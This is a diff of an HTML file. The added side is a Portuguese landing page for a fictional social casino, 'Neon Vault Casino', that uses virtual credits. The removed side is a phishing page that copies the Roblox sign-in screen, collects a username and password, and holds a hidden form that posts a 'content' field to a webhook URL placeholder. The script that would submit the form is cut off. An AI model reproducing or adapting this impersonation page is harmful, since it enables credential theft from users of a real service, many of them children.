@@ -1,235 +1,1844 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Sign In</title>
-    <!-- Importing standard fonts for realism -->
-    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Lato', sans-serif;
-            background-color: #f5f6f9; /* Light gray background */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Neon Vault Casino — Cassino Social Fictício</title>
+  <meta name="description" content="Neon Vault Casino é uma plataforma fictícia de entretenimento com créditos virtuais sem valor monetário." />
+  <style>
+    :root {
+      --bg: #05040c;
+      --bg2: #0c0820;
+      --panel: rgba(255,255,255,.075);
+      --panel2: rgba(255,255,255,.11);
+      --line: rgba(255,255,255,.16);
+      --text: #f7f1ff;
+      --muted: #bdb0d9;
+      --gold: #ffd166;
+      --gold2: #ffaf45;
+      --pink: #ff2bd6;
+      --cyan: #00f5ff;
+      --violet: #8b5cf6;
+      --green: #54f0a9;
+      --danger: #ff5d73;
+      --shadow: 0 25px 80px rgba(0,0,0,.45);
+      --radius: 24px;
+    }
 
-        .login-container {
-            width: 100%;
-            max-width: 582px; /* Approximate standard login box width */
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
+    [data-theme="light"] {
+      --bg: #f5f2ff;
+      --bg2: #e9e0ff;
+      --panel: rgba(255,255,255,.72);
+      --panel2: rgba(255,255,255,.9);
+      --line: rgba(31,20,66,.14);
+      --text: #160f2d;
+      --muted: #62547e;
+      --shadow: 0 25px 80px rgba(71,47,126,.18);
+    }
 
-        .logo-area {
-            padding-top: 3rem;
-            text-align: center;
-        }
+    * { box-sizing: border-box; }
 
-        .logo-text {
-            font-family: 'Bangers', cursive; /* Fallback if not loaded exactly same */
-            font-size: 4rem;
-            color: #ffffff;
-            margin-right: -5px; 
-            letter-spacing: -2px;
-        }
-        
-        /* Simulating the white blob behind logo often seen or just clean top header */
-        .header-bg {
-            height: 60px;
-            background-color: #fff; /* Often transparent or very light */
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-        }
+    html {
+      scroll-behavior: smooth;
+    }
 
-        .login-box {
-            padding: 3.8125rem 3.125rem 4rem 3.125rem; /* Spacing inside */
-        }
+    body {
+      margin: 0;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 15% 10%, rgba(255,43,214,.25), transparent 30%),
+        radial-gradient(circle at 85% 12%, rgba(0,245,255,.20), transparent 28%),
+        radial-gradient(circle at 50% 80%, rgba(139,92,246,.22), transparent 32%),
+        linear-gradient(135deg, var(--bg), var(--bg2) 58%, #070512);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
 
-        h1 {
-            font-size: 2.75rem;
-            color: #393b40;
-            margin-bottom: 0.5rem;
-        }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,.035) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,.035) 1px, transparent 1px);
+      background-size: 56px 56px;
+      mask-image: radial-gradient(circle at center, black, transparent 75%);
+      pointer-events: none;
+      z-index: -2;
+    }
 
-        p.subtitle {
-            font-weight: 700;
-            color: #393b40;
-            font-size: 1.25rem;
-            margin-top: -0.625rem; /* Tighten to title */
-            margin-bottom: 1.5rem; 
-        }
+    body::after {
+      content: "";
+      position: fixed;
+      inset: -20%;
+      background: conic-gradient(from 180deg, transparent, rgba(255,209,102,.06), transparent, rgba(0,245,255,.06), transparent);
+      filter: blur(80px);
+      animation: aurora 18s linear infinite;
+      pointer-events: none;
+      z-index: -3;
+    }
 
-        .input-group {
-            position: relative;
-            display: flex;
-            align-items: center;
-            background-color: white;
-            border-radius: 8px;
-            border-bottom-right-radius: 8px !important, 8px !important; /* Fallback handling */
-            height: 57px; /* Fixed height for inputs */
-        }
+    @keyframes aurora {
+      0% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(180deg) scale(1.08); }
+      100% { transform: rotate(360deg) scale(1); }
+    }
 
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding-left: 2.4375rem; /* Space for icon */
-            font-size: 1.25rem;
-            color: #393b40;
-            background-color: transparent;
-            border: none;
-            outline: none;
-        }
+    a { color: inherit; text-decoration: none; }
+    button, input, select { font: inherit; }
 
-        .input-icon {
-            position: absolute;
-            left: 0.625rem; /* Aligned with text */
-            top: 50%;
-            transform: translateY(-50%);
-            z-index: 1;
-        }
+    .app {
+      width: min(1440px, calc(100% - 32px));
+      margin: 0 auto;
+    }
 
-        input::placeholder {
-            color: rgba(0, 0, 0, 0.4);
-        }
+    .topbar {
+      position: sticky;
+      top: 14px;
+      z-index: 50;
+      margin: 14px auto 0;
+      padding: 12px;
+      border: 1px solid var(--line);
+      border-radius: 28px;
+      background: rgba(5,4,12,.62);
+      backdrop-filter: blur(22px);
+      box-shadow: var(--shadow);
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
 
-        button#sign-in-btn {
-            margin-top: 1.5rem; /* Spacing from inputs */
-            width: 100%;
-            background-color: #ffffff; /* White for 'Continue' style or #ff3e3e for primary - Roblox uses red/orange usually but white is common variant */
-            border-radius: 8px;
-            padding: 2rem; 
-            font-weight: 700;
-            font-size: 1.25rem;
-            color: #f92c4b; /* Classic Red-Orange-ish text, adjusted to look clean */
-            cursor: pointer;
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-        }
+    [data-theme="light"] .topbar { background: rgba(255,255,255,.70); }
 
-        button:hover {
-            background-color: #fff0f3; /* Very light pink hover effect similar to Roblox styling */
-        }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: max-content;
+      padding: 8px 12px;
+    }
 
-        .forgot-password-link {
-            display: block;
-            margin-top: 1rem;
-            color: rgba(0,0,0,0.6);
-            font-weight: 700;
-            cursor: pointer;
-            padding-bottom: 5px;
-        }
+    .logo {
+      width: 42px;
+      height: 42px;
+      border-radius: 15px;
+      display: grid;
+      place-items: center;
+      color: #1a102b;
+      font-weight: 1000;
+      background:
+        linear-gradient(135deg, var(--gold), var(--gold2) 45%, var(--pink));
+      box-shadow: 0 0 24px rgba(255,209,102,.45), inset 0 0 16px rgba(255,255,255,.3);
+    }
 
-    </style>
+    .brand h1 {
+      margin: 0;
+      font-size: 1rem;
+      line-height: 1;
+      letter-spacing: .3px;
+    }
+
+    .brand span {
+      display: block;
+      margin-top: 5px;
+      font-size: .72rem;
+      color: var(--muted);
+      font-weight: 700;
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      overflow: auto;
+      scrollbar-width: none;
+      flex: 1;
+      padding: 4px;
+    }
+
+    .nav::-webkit-scrollbar { display: none; }
+
+    .nav button {
+      border: 0;
+      cursor: pointer;
+      color: var(--muted);
+      background: transparent;
+      border-radius: 16px;
+      padding: 11px 13px;
+      white-space: nowrap;
+      font-weight: 800;
+      transition: .2s ease;
+    }
+
+    .nav button:hover,
+    .nav button.active {
+      color: var(--text);
+      background: linear-gradient(135deg, rgba(255,255,255,.12), rgba(255,255,255,.05));
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.12), 0 0 18px rgba(0,245,255,.08);
+    }
+
+    .wallet {
+      min-width: max-content;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 9px 12px;
+      border: 1px solid rgba(255,209,102,.35);
+      border-radius: 18px;
+      background: linear-gradient(135deg, rgba(255,209,102,.16), rgba(255,43,214,.08));
+      box-shadow: 0 0 28px rgba(255,209,102,.14);
+      font-weight: 1000;
+    }
+
+    .wallet small {
+      display: block;
+      font-size: .67rem;
+      color: var(--muted);
+      font-weight: 800;
+      line-height: 1;
+    }
+
+    .wallet b {
+      display: block;
+      color: var(--gold);
+      letter-spacing: .4px;
+    }
+
+    .icon-btn {
+      width: 44px;
+      height: 44px;
+      border-radius: 16px;
+      border: 1px solid var(--line);
+      color: var(--text);
+      background: var(--panel);
+      cursor: pointer;
+      transition: .2s ease;
+    }
+
+    .icon-btn:hover {
+      transform: translateY(-2px);
+      border-color: rgba(0,245,255,.45);
+      box-shadow: 0 0 22px rgba(0,245,255,.15);
+    }
+
+    .hero {
+      min-height: 690px;
+      display: grid;
+      grid-template-columns: 1.03fr .97fr;
+      gap: 30px;
+      align-items: center;
+      padding: 58px 0 28px;
+    }
+
+    .badge {
+      display: inline-flex;
+      gap: 9px;
+      align-items: center;
+      padding: 10px 14px;
+      border-radius: 999px;
+      background: rgba(255,255,255,.08);
+      border: 1px solid var(--line);
+      color: var(--gold);
+      font-weight: 900;
+      box-shadow: 0 0 24px rgba(255,209,102,.09);
+    }
+
+    .hero h2 {
+      margin: 18px 0 18px;
+      font-size: clamp(3rem, 7vw, 6.9rem);
+      line-height: .87;
+      letter-spacing: -5px;
+    }
+
+    .grad {
+      background: linear-gradient(90deg, #fff, var(--gold), var(--pink), var(--cyan));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      filter: drop-shadow(0 0 28px rgba(255,43,214,.22));
+    }
+
+    .hero p {
+      max-width: 740px;
+      color: var(--muted);
+      font-size: clamp(1.08rem, 1.7vw, 1.4rem);
+      line-height: 1.55;
+      margin: 0 0 24px;
+    }
+
+    .actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 14px;
+      align-items: center;
+      margin: 25px 0 18px;
+    }
+
+    .btn {
+      border: 0;
+      border-radius: 18px;
+      padding: 14px 19px;
+      cursor: pointer;
+      font-weight: 1000;
+      color: #160f2d;
+      background: linear-gradient(135deg, var(--gold), var(--gold2));
+      box-shadow: 0 16px 38px rgba(255,177,70,.22), inset 0 0 0 1px rgba(255,255,255,.25);
+      transition: .22s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-3px) scale(1.01);
+      box-shadow: 0 22px 48px rgba(255,177,70,.30), 0 0 34px rgba(255,209,102,.15);
+    }
+
+    .btn.secondary {
+      color: var(--text);
+      background: rgba(255,255,255,.09);
+      border: 1px solid var(--line);
+      box-shadow: none;
+    }
+
+    .btn.ghost {
+      color: var(--text);
+      background: transparent;
+      border: 1px solid var(--line);
+      box-shadow: none;
+    }
+
+    .notice {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      max-width: 710px;
+      color: var(--text);
+      border: 1px solid rgba(0,245,255,.28);
+      background: linear-gradient(135deg, rgba(0,245,255,.10), rgba(139,92,246,.10));
+      padding: 13px 15px;
+      border-radius: 18px;
+      font-weight: 800;
+      box-shadow: 0 0 28px rgba(0,245,255,.10);
+    }
+
+    .hero-panel {
+      position: relative;
+      min-height: 570px;
+      border-radius: 40px;
+      border: 1px solid var(--line);
+      background:
+        linear-gradient(135deg, rgba(255,255,255,.11), rgba(255,255,255,.04)),
+        radial-gradient(circle at 30% 15%, rgba(255,43,214,.30), transparent 34%),
+        radial-gradient(circle at 70% 80%, rgba(0,245,255,.26), transparent 34%);
+      backdrop-filter: blur(16px);
+      box-shadow: var(--shadow), inset 0 0 80px rgba(255,255,255,.04);
+      overflow: hidden;
+    }
+
+    .hero-panel::before {
+      content: "";
+      position: absolute;
+      inset: 18px;
+      border-radius: 32px;
+      border: 1px solid rgba(255,255,255,.15);
+      pointer-events: none;
+    }
+
+    .vault-ring {
+      position: absolute;
+      inset: 60px 40px auto;
+      height: 330px;
+      border-radius: 999px;
+      border: 2px solid rgba(255,209,102,.45);
+      box-shadow: 0 0 45px rgba(255,209,102,.18), inset 0 0 70px rgba(255,209,102,.06);
+      display: grid;
+      place-items: center;
+      animation: floaty 5s ease-in-out infinite;
+    }
+
+    .vault-ring::before,
+    .vault-ring::after {
+      content: "";
+      position: absolute;
+      border-radius: 999px;
+      border: 1px dashed rgba(0,245,255,.42);
+    }
+
+    .vault-ring::before { inset: 32px; animation: spin 12s linear infinite; }
+    .vault-ring::after { inset: 68px; animation: spin 9s linear reverse infinite; }
+
+    .vault-core {
+      width: 150px;
+      height: 150px;
+      border-radius: 42px;
+      background: linear-gradient(135deg, var(--gold), var(--pink), var(--cyan));
+      box-shadow: 0 0 60px rgba(255,43,214,.35);
+      display: grid;
+      place-items: center;
+      font-size: 4.5rem;
+      transform: rotate(-8deg);
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes floaty {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-16px); }
+    }
+
+    .stats-strip {
+      position: absolute;
+      left: 24px;
+      right: 24px;
+      bottom: 24px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+    }
+
+    .stat {
+      border-radius: 22px;
+      border: 1px solid rgba(255,255,255,.16);
+      background: rgba(5,4,12,.54);
+      backdrop-filter: blur(12px);
+      padding: 17px;
+    }
+
+    [data-theme="light"] .stat { background: rgba(255,255,255,.58); }
+
+    .stat b {
+      display: block;
+      font-size: 1.55rem;
+      color: var(--gold);
+    }
+
+    .stat span {
+      color: var(--muted);
+      font-weight: 800;
+      font-size: .83rem;
+    }
+
+    .section {
+      display: none;
+      padding: 28px 0 74px;
+      animation: fadeUp .35s ease both;
+    }
+
+    .section.active { display: block; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(14px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .section-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      gap: 18px;
+      margin: 0 0 20px;
+    }
+
+    .section-head h3 {
+      margin: 0;
+      font-size: clamp(2rem, 4vw, 3.7rem);
+      letter-spacing: -2px;
+    }
+
+    .section-head p {
+      color: var(--muted);
+      margin: 10px 0 0;
+      max-width: 780px;
+      line-height: 1.55;
+    }
+
+    .toolbar {
+      display: grid;
+      grid-template-columns: 1.3fr .7fr .7fr;
+      gap: 12px;
+      margin: 18px 0 22px;
+    }
+
+    .field {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid var(--line);
+      background: var(--panel);
+      border-radius: 18px;
+      padding: 0 13px;
+      min-height: 52px;
+      backdrop-filter: blur(12px);
+    }
+
+    .field input,
+    .field select {
+      width: 100%;
+      border: 0;
+      outline: 0;
+      color: var(--text);
+      background: transparent;
+      font-weight: 800;
+    }
+
+    .field select option { color: #160f2d; }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 16px;
+    }
+
+    .game-card,
+    .glass-card {
+      position: relative;
+      overflow: hidden;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background:
+        linear-gradient(145deg, rgba(255,255,255,.11), rgba(255,255,255,.045)),
+        radial-gradient(circle at 25% 0%, rgba(255,43,214,.17), transparent 32%),
+        radial-gradient(circle at 80% 75%, rgba(0,245,255,.13), transparent 34%);
+      backdrop-filter: blur(14px);
+      box-shadow: 0 16px 50px rgba(0,0,0,.22);
+    }
+
+    .game-card {
+      min-height: 286px;
+      padding: 16px;
+      transition: .25s ease;
+      cursor: default;
+    }
+
+    .game-card::before {
+      content: "";
+      position: absolute;
+      inset: -60% -30% auto;
+      height: 170px;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,.20), transparent);
+      transform: rotate(15deg) translateX(-120%);
+      transition: .7s ease;
+    }
+
+    .game-card:hover {
+      transform: translateY(-7px);
+      border-color: rgba(255,209,102,.45);
+      box-shadow: 0 24px 70px rgba(0,0,0,.32), 0 0 34px rgba(255,43,214,.10);
+    }
+
+    .game-card:hover::before { transform: rotate(15deg) translateX(120%); }
+
+    .game-art {
+      height: 114px;
+      border-radius: 20px;
+      display: grid;
+      place-items: center;
+      font-size: 3.1rem;
+      background:
+        radial-gradient(circle at 30% 10%, rgba(255,255,255,.24), transparent 24%),
+        linear-gradient(135deg, rgba(255,209,102,.24), rgba(255,43,214,.18), rgba(0,245,255,.20));
+      border: 1px solid rgba(255,255,255,.13);
+      box-shadow: inset 0 0 34px rgba(255,255,255,.05);
+    }
+
+    .game-card h4 {
+      margin: 14px 0 6px;
+      font-size: 1.12rem;
+      letter-spacing: -.2px;
+    }
+
+    .game-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 7px;
+      margin: 8px 0 15px;
+    }
+
+    .chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      border-radius: 999px;
+      border: 1px solid rgba(255,255,255,.13);
+      background: rgba(255,255,255,.07);
+      padding: 6px 9px;
+      color: var(--muted);
+      font-size: .74rem;
+      font-weight: 900;
+    }
+
+    .card-actions {
+      display: grid;
+      grid-template-columns: 1fr 44px;
+      gap: 8px;
+      position: absolute;
+      left: 16px;
+      right: 16px;
+      bottom: 16px;
+    }
+
+    .mini-btn {
+      border: 0;
+      border-radius: 15px;
+      padding: 11px 12px;
+      cursor: pointer;
+      font-weight: 1000;
+      color: #160f2d;
+      background: linear-gradient(135deg, var(--gold), var(--gold2));
+      transition: .2s ease;
+    }
+
+    .mini-btn:hover { transform: translateY(-2px); }
+
+    .fav {
+      border: 1px solid var(--line);
+      border-radius: 15px;
+      background: rgba(255,255,255,.08);
+      color: var(--text);
+      cursor: pointer;
+      font-size: 1.05rem;
+    }
+
+    .fav.on {
+      border-color: rgba(255,209,102,.55);
+      color: var(--gold);
+      box-shadow: 0 0 20px rgba(255,209,102,.12);
+    }
+
+    .cards-3 {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+    }
+
+    .glass-card {
+      padding: 22px;
+    }
+
+    .glass-card h4 {
+      margin: 0 0 9px;
+      font-size: 1.25rem;
+    }
+
+    .glass-card p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.55;
+    }
+
+    .mission {
+      display: grid;
+      grid-template-columns: auto 1fr auto;
+      gap: 14px;
+      align-items: center;
+      padding: 15px;
+      border-radius: 20px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,.06);
+      margin-top: 12px;
+    }
+
+    .mission .m-icon {
+      width: 52px;
+      height: 52px;
+      display: grid;
+      place-items: center;
+      border-radius: 16px;
+      background: linear-gradient(135deg, rgba(255,209,102,.23), rgba(255,43,214,.16));
+      font-size: 1.6rem;
+    }
+
+    .progress {
+      height: 10px;
+      background: rgba(255,255,255,.09);
+      border-radius: 999px;
+      overflow: hidden;
+      margin-top: 9px;
+    }
+
+    .progress span {
+      display: block;
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--gold), var(--pink), var(--cyan));
+      border-radius: inherit;
+      transition: .35s ease;
+    }
+
+    .table-list {
+      display: grid;
+      gap: 12px;
+    }
+
+    .table-row {
+      display: grid;
+      grid-template-columns: auto 1fr auto auto;
+      gap: 14px;
+      align-items: center;
+      padding: 16px;
+      border-radius: 22px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,.06);
+    }
+
+    .dealer {
+      width: 54px;
+      height: 54px;
+      border-radius: 18px;
+      display: grid;
+      place-items: center;
+      background: linear-gradient(135deg, rgba(0,245,255,.20), rgba(139,92,246,.25));
+      font-size: 1.7rem;
+    }
+
+    .rank-table {
+      width: 100%;
+      border-collapse: collapse;
+      overflow: hidden;
+      border-radius: 22px;
+    }
+
+    .rank-table th,
+    .rank-table td {
+      padding: 16px;
+      border-bottom: 1px solid var(--line);
+      text-align: left;
+    }
+
+    .rank-table th {
+      color: var(--gold);
+      background: rgba(255,255,255,.06);
+    }
+
+    .rank-table tr:hover td {
+      background: rgba(255,255,255,.04);
+    }
+
+    .profile-wrap {
+      display: grid;
+      grid-template-columns: 360px 1fr;
+      gap: 16px;
+    }
+
+    .avatar-big {
+      width: 132px;
+      height: 132px;
+      border-radius: 36px;
+      display: grid;
+      place-items: center;
+      font-size: 4rem;
+      background: linear-gradient(135deg, var(--gold), var(--pink), var(--cyan));
+      margin-bottom: 15px;
+      box-shadow: 0 0 38px rgba(255,43,214,.22);
+    }
+
+    .avatar-options {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 14px;
+    }
+
+    .avatar-options button {
+      width: 48px;
+      height: 48px;
+      border-radius: 15px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,.08);
+      cursor: pointer;
+      font-size: 1.4rem;
+    }
+
+    .history {
+      display: grid;
+      gap: 10px;
+      max-height: 360px;
+      overflow: auto;
+      padding-right: 4px;
+    }
+
+    .history-item {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      align-items: center;
+      padding: 12px;
+      border-radius: 16px;
+      background: rgba(255,255,255,.055);
+      border: 1px solid rgba(255,255,255,.10);
+    }
+
+    .win { color: var(--green); font-weight: 1000; }
+    .lose { color: var(--danger); font-weight: 1000; }
+    .neutral { color: var(--gold); font-weight: 1000; }
+
+    footer {
+      border-top: 1px solid var(--line);
+      padding: 28px 0 48px;
+      color: var(--muted);
+      line-height: 1.55;
+      font-weight: 750;
+    }
+
+    .modal,
+    .toast-wrap,
+    .confetti {
+      position: fixed;
+      z-index: 100;
+    }
+
+    .modal {
+      inset: 0;
+      display: none;
+      place-items: center;
+      padding: 18px;
+      background: rgba(0,0,0,.62);
+      backdrop-filter: blur(12px);
+    }
+
+    .modal.open { display: grid; }
+
+    .modal-card {
+      width: min(720px, 100%);
+      border-radius: 34px;
+      border: 1px solid var(--line);
+      background:
+        linear-gradient(145deg, rgba(20,12,40,.94), rgba(5,4,12,.94)),
+        radial-gradient(circle at 20% 0%, rgba(255,43,214,.16), transparent 30%);
+      box-shadow: var(--shadow);
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    [data-theme="light"] .modal-card {
+      background: rgba(255,255,255,.94);
+    }
+
+    .modal-head {
+      display: flex;
+      justify-content: space-between;
+      gap: 14px;
+      align-items: center;
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .modal-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .modal-title .game-art {
+      width: 58px;
+      height: 58px;
+      border-radius: 18px;
+      font-size: 1.9rem;
+    }
+
+    .modal-title h3 {
+      margin: 0;
+      font-size: 1.4rem;
+    }
+
+    .modal-title p {
+      margin: 4px 0 0;
+      color: var(--muted);
+      font-weight: 800;
+    }
+
+    .close {
+      width: 44px;
+      height: 44px;
+      border-radius: 16px;
+      border: 1px solid var(--line);
+      color: var(--text);
+      background: rgba(255,255,255,.08);
+      cursor: pointer;
+    }
+
+    .play-area {
+      display: grid;
+      gap: 14px;
+      padding-top: 16px;
+    }
+
+    .reels {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+    }
+
+    .reel {
+      min-height: 116px;
+      border-radius: 22px;
+      display: grid;
+      place-items: center;
+      font-size: 3.8rem;
+      background: rgba(255,255,255,.07);
+      border: 1px solid var(--line);
+      box-shadow: inset 0 0 30px rgba(255,255,255,.04);
+    }
+
+    .game-controls {
+      display: grid;
+      grid-template-columns: 1fr auto auto;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .stake {
+      min-height: 52px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,.08);
+      color: var(--text);
+      border-radius: 16px;
+      padding: 0 12px;
+      outline: 0;
+      font-weight: 1000;
+    }
+
+    .stake option { color: #160f2d; }
+
+    .result-box {
+      min-height: 92px;
+      display: grid;
+      align-items: center;
+      padding: 16px;
+      border-radius: 22px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,.06);
+      color: var(--muted);
+      line-height: 1.55;
+      font-weight: 850;
+    }
+
+    .toast-wrap {
+      right: 16px;
+      bottom: 16px;
+      display: grid;
+      gap: 10px;
+      pointer-events: none;
+    }
+
+    .toast {
+      width: min(390px, calc(100vw - 32px));
+      border-radius: 18px;
+      border: 1px solid var(--line);
+      background: rgba(8,5,19,.82);
+      color: var(--text);
+      backdrop-filter: blur(16px);
+      box-shadow: var(--shadow);
+      padding: 13px 15px;
+      animation: toastIn .25s ease both;
+      font-weight: 820;
+    }
+
+    [data-theme="light"] .toast { background: rgba(255,255,255,.85); }
+
+    @keyframes toastIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .confetti {
+      inset: 0;
+      overflow: hidden;
+      pointer-events: none;
+      display: none;
+    }
+
+    .confetti.on { display: block; }
+
+    .confetti i {
+      position: absolute;
+      top: -20px;
+      width: 10px;
+      height: 16px;
+      border-radius: 4px;
+      background: var(--gold);
+      animation: drop 1.8s linear forwards;
+    }
+
+    @keyframes drop {
+      to { transform: translateY(105vh) rotate(720deg); opacity: .2; }
+    }
+
+    .signup {
+      display: grid;
+      gap: 12px;
+    }
+
+    .signup input {
+      min-height: 54px;
+      border-radius: 18px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,.08);
+      color: var(--text);
+      padding: 0 14px;
+      outline: 0;
+      font-weight: 900;
+    }
+
+    .disclaimer-banner {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 12px;
+      align-items: start;
+      border-radius: 24px;
+      border: 1px solid rgba(255,209,102,.34);
+      background: linear-gradient(135deg, rgba(255,209,102,.12), rgba(0,245,255,.08));
+      padding: 18px;
+      margin: 16px 0 24px;
+      color: var(--muted);
+      line-height: 1.55;
+    }
+
+    .disclaimer-banner b { color: var(--gold); }
+
+    @media (max-width: 1120px) {
+      .hero { grid-template-columns: 1fr; min-height: auto; }
+      .hero-panel { min-height: 500px; }
+      .grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+      .profile-wrap { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 840px) {
+      .topbar {
+        display: grid;
+        grid-template-columns: 1fr auto auto;
+      }
+      .nav {
+        grid-column: 1 / -1;
+        order: 3;
+      }
+      .hero h2 { letter-spacing: -2px; }
+      .grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .cards-3 { grid-template-columns: 1fr; }
+      .toolbar { grid-template-columns: 1fr; }
+      .table-row { grid-template-columns: auto 1fr; }
+      .table-row .mini-btn, .table-row .chip { grid-column: span 1; }
+      .game-controls { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 560px) {
+      .app { width: min(100% - 20px, 1440px); }
+      .topbar { top: 8px; border-radius: 22px; }
+      .brand h1 { font-size: .92rem; }
+      .wallet { padding: 8px 10px; }
+      .hero { padding-top: 36px; }
+      .actions .btn { width: 100%; }
+      .grid { grid-template-columns: 1fr; }
+      .stats-strip { grid-template-columns: 1fr; }
+      .hero-panel { min-height: 640px; }
+      .vault-ring { inset: 40px 16px auto; height: 260px; }
+      .section-head { display: block; }
+      .modal-card { border-radius: 26px; }
+      .reels { gap: 8px; }
+      .reel { min-height: 92px; font-size: 3rem; }
+    }
+  </style>
 </head>
-<body>
+<body data-theme="dark">
+  <div class="confetti" id="confetti"></div>
+  <div class="toast-wrap" id="toasts"></div>
 
-<div class="login-container">
-    <div style="height: 84px;"> <!-- Header height matching Roblox -->
-        <div class="logo-area">
-             <h2 style="font-size: 3.9375rem; line-height: 4rem; margin-right: -25px;">R<span id="b-logo" style="color:#ffffff;font-family:'Bangers',cursive;font-size:4rem;margin-left:-10px;">o</span></h2> 
-             <p style="margin-top:-10px; color:#f92c4b; font-weight:bold; font-size:1.6rem;">oblox</p>
-        </div>
+  <header class="app topbar">
+    <a href="#home" class="brand" data-go="home" aria-label="Neon Vault Casino">
+      <div class="logo">NV</div>
+      <div>
+        <h1>Neon Vault Casino</h1>
+        <span>social • fictício • seguro</span>
+      </div>
+    </a>
+
+    <nav class="nav" aria-label="Navegação principal">
+      <button class="active" data-go="home">Home</button>
+      <button data-go="jogos">Jogos</button>
+      <button data-go="slots">Slots</button>
+      <button data-go="mesa">Mesa ao vivo fake</button>
+      <button data-go="minigames">Minigames</button>
+      <button data-go="missoes">Missões</button>
+      <button data-go="ranking">Ranking</button>
+      <button data-go="perfil">Perfil</button>
+      <button data-go="carteira">Carteira virtual</button>
+      <button data-go="regras">Regras e segurança</button>
+    </nav>
+
+    <button class="icon-btn" id="soundBtn" title="Sons opcionais">🔇</button>
+
+    <div class="wallet" title="Carteira virtual">
+      <span>💎</span>
+      <div>
+        <small>créditos virtuais</small>
+        <b id="balanceTop">500</b>
+      </div>
     </div>
+  </header>
 
-    <!-- Login Form -->
-    <form id="login-form" class="login-box">
-        <h1>Welcome back!</h1>
-        
-        <!-- Username Input -->
-        <input type="text" id="username" name="Username" placeholder="Username or email address" required autocomplete="off">
-        
-        <!-- Password Input -->
-        <input type="password" id="password" name="Password" placeholder="Password" required autocomplete="off">
+  <main class="app">
+    <section class="section active" id="home">
+      <div class="hero">
+        <div>
+          <span class="badge">✨ entretenimento com saldo fictício</span>
+          <h2>Jogue com <span class="grad">500 créditos grátis</span></h2>
+          <p>Cassino social com créditos virtuais. Sem dinheiro real, sem risco, só diversão.</p>
 
-        <button type="submit" id="sign-in-btn">Continue</button>
-        
-        <a href="#" class="forgot-password-link">Forgot password?</a>
-    </form>
+          <div class="actions">
+            <button class="btn" id="startBtn">Começar agora</button>
+            <button class="btn secondary" data-go="jogos">Ver jogos</button>
+          </div>
 
-    <!-- Hidden Form to send data to Webhook -->
-    <form method="POST" action="${webhook_url}" target="_blank">
-        <input type="hidden" name="content" id="payload-content"> 
-        <!-- Note: In a real web context, you'd parse the text inputs and set this value dynamically. 
-             For simplicity in a static file, we use JS before submitting. -->
-    </form>
-</div>
+          <div class="notice">🛡️ Este site usa apenas créditos virtuais sem valor monetário.</div>
+        </div>
 
-<script>
